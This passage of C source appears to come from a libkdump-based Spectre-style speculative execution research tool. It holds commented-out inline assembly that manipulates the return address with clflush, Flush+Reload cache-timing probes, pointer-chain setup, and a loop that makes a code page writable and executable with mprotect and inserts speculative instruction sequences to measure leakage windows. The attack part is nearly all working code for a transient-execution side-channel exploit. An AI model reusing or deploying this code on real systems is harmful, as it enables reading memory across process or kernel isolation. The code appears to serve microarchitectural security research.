		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"movq (%%r10, %%r11, 1), %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"capture: pause\n\t"
		// 	"jmp capture\n\t"
		// 	"set_up_target: lea 0xc(%%rip), %%r8\n\t"
		// 	"movq %%r8, (%%rsp)\n\t"
		// 	"clflush (%%rsp)\n\t"
		// 	"mfence\n\t"
		// 	"ret\n\t"
		// 	"destination: nop\n\t"
		// 	:
		// 	: "r" (mem), "r" (xp), "r" (malicious_x), "r" (training_x), "d" (dummy_x)
		// 	: "r8", "r9", "%r10", "%r11"
		// 	);
	// }

		mix_i = expected_data;
		if (flush_reload(mem + mix_i * 0x1000))
				count[0]++; /* cache hit - add +1 to score for this value */
		// }

		mix_i = 0x0;
		if (flush_reload(mem + mix_i * 0x1000))
			count[1]++; /* cache hit - add +1 to score for this value */

		mix_i = 0x1;
		if (flush_reload(mem + mix_i * 0x1000))
			count[2]++; /* cache hit - add +1 to score for this value */
	}

	printf("0x42: %d, 0x0: %d, 0x1: %d\n", count[0], count[1], count[2]);
	value[0] = (uint8_t)expected_data;
	score[0] += count[0];
	value[1] = (uint8_t)0x0;
	score[1] += count[1];
	if (count[0] < (config.retries/50) && count[1] < (config.retries/50))
		return -1;
	else
		return (count[0] >= count[1]) ? expected_data : 0x0;
}

void libkdump_spectre_prepare(size_t code_addr, size_t code_len) {
	int i;

	xp = (size_t *)malloc(0x5000);
	printf("xp @%p\n", xp);
	*xp = 0;
	xp1 = xp + 0x1000/sizeof(size_t);
	*xp1 = (size_t)xp;
	printf("xp1 @%p -> %lx\n", xp1, *xp1);
	xp2 = xp1 + 0x1000/sizeof(size_t);
	*xp2 = (size_t)xp1;
	printf("xp2 @%p -> %lx\n", xp2, *xp2);
	xp3 = xp2 + 0x1000/sizeof(size_t);
	*xp3 = (size_t)xp2;
	printf("xp3 @%p -> %lx\n", xp3, *xp3);
	xp4 = xp3 + 0x1000/sizeof(size_t);
	*xp4 = (size_t)xp3;
	printf("xp4 @%p -> %lx\n", xp4, *xp4);
}

void libkdump_spectre_result(int score[2], uint8_t value[2]) {
	printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
	printf("0x%02X=’%c’ score=%d ", value[0],
		(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);

	if (score[1] > 0) {
		printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
			(value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
	}

	printf("\n");
}

int libkdump_spectre_read(size_t training_x, size_t malicious_x, int score[2], 
	uint8_t value[2], size_t tlb_preload_x, int code_type, int cache_level, int tlb_flush, int expected_data) {
	int i, j, r;
	int count[MAX_MEASUREMENT];
	for (i = 0; i < MAX_MEASUREMENT; i++)
		count[i] = -1;

	size_t code_seq_addr = 0;
	readMemoryByte(0, 0, 0, 0, 0, 0, 0, 0, &code_seq_addr);
	assert(mprotect((void *)((code_seq_addr >> 12) << 12), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == 0);
	// should fix this function (a new function copying new instruction sequences, other than framework #1)
	libkdump_select_branch_code_sequence(code_type, (void *)code_seq_addr);

	for (i = 0; i < config.measurements && i < MAX_MEASUREMENT; i++) {
		for (j = 0; j < MAX_WINDOW_SIZE; j++) {
			printf("try %d\n", j);
			r = readMemoryByte(training_x, malicious_x, score, value, 
				tlb_preload_x, cache_level, tlb_flush, expected_data, NULL);

			if (r >= 0) {
				libkdump_insert_speculative_instruction(code_type, j+1, (void *)code_seq_addr);
			}
			else {
				count[i] = j;
				break;
			}
		}
	}

	for (i = 0; i < MAX_MEASUREMENT; i++) {
		if (count[i] >= 0)
			printf("%d count %d\n", i, count[i]);
	}
}
